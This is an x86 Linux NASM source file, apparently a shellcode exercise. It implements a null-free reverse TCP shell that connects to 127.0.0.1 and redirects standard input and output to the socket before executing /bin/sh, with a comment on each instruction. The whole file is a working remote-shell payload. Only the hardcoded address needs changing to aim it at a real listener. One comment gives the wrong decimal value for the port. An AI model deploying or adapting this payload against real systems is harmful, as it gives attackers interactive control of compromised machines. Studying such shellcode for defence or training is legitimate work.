;reverse.nasm
;this creates a /bin/sh reverse  TCP shell
;Linux x86
;Sanjiv Kawa (@skawasec)
;www.popped.io
;Decemeber 6, 2016

global _start

section .text

_start:

  ;socket
  xor ebx, ebx ;zero out ebx
  mul ebx ;this zero's out eax and edx also

  mov al, 0x66 ;socketcall syscall
  mov bl, 0x1 ;socketcall type, socket

  ;populate the stack with the arguments for socket
  push edx ;socket protocol 0x0 is moved on to the stack
  push ebx ;socket type 1, SOCK_STREAM, is moved on to the stack
  push 0x2 ;socket domain 2, PF_INET, is moved on to the stack

  ;set up the socketcall syscall
  mov ecx, esp  ;all arguments for socket, as required by socketcall are pointed to by ECX
  int 0x80 ;execute socket syscall

  xchg edx, eax ;move the return value from the socket syscall into edx for preservation, also zero out eax.

  ;connect
  mov al, 0x66 ;socketcall syscall
  mov bl, 0x3 ;ebx contains 3, for the type of socketcall, which is connect

  ;populate the stack with the arguments for the sockaddr_in structure
  push 0x0100007f  ;sin_addr, 127.0.0.1, is pushed on to the stack (8 bytes)
  push word 0x270f  ;sin_port, 3879, is pushed on to the stack (unsigned int, 16 bits) (4 bytes)
  push word 0x2  ;sin_family, AF_NET, which is 2, the same as PF_INET (unsigned int, 16 bits) (4 bytes)

  mov ecx, esp ;the stack pointer to the sockaddr_in structure is moved into ecx

  push 0x10; push connect addrlen to the stack, the length of the struct is 16 bytes (8 + 4 + 4)
  push ecx ;the stack pointer to the sockaddr_in structure pushed on to the stack
  push edx; push connect sockfd to the stack, this is the value of the file descriptor returned to socket

  mov ecx, esp ;update ecx to the stack pointer which currently contains a pointer to "sockfd, sockaddr_in, addrlen". All arguments for connect, as required by socketcall are pointed to by ECX
  int 0x80  ;execute connect syscall
  
  ;dup2
  mov ebx, edx ;move the socket file descriptor into EBX to satisfy the oldf2 argument for dup2
  xor ecx, ecx  ;clear out ecx
  mov cl, 0x2 ;set 2 as the counter for the dup2 loop. The significance of 2 is for STDIN(0), STDOUT(1) and STDERR(2)

redirection_loop:
  mov al, 0x3f ;dup2 syscall
  int 0x80 ;execute dup2 syscall
  dec ecx ;decrement the loop counter
  jns redirection_loop ;conditional jump to the redirection_loop as long as the signed flag (SF) is not set.


  ;execve /bin/sh
  xor eax, eax  ;zero out eax
  push eax      ;push 00000000 on to the stack


  push 0x68732f6e ;push hex hs/n on to the stack
  push 0x69622f2f ;push hex ib// on to the stack

  ;at this point the stack contains //bin/sh0x00000000
  mov ebx, esp  ;this satisfies the requirements for *filename (first argument of execve)

  push eax      ;push 00000000 on to the stack

  ;at this point the stack contains 0x00000000//bin/sh0x00000000
  mov edx, esp  ;we cant pop 0x00000000 into EDX as the shellcode cannot have any null characters.
                ;instead we move the current address pointed to by ESP into EDX.
                ;this address contains the last value pushed on to the stack, which is 0x00000000
                ;this satisfies the requirements for envp (third argument of execve)

  push ebx      ;ebx contains the memory address of the stack where //bin/sh0x00000000 is.
  mov ecx, esp  ;this satisfies the requirements for argv (second argument of execve)

  mov al, 11     ;execve syscall number, 0xb works also.
  int 0x80       ;initiate
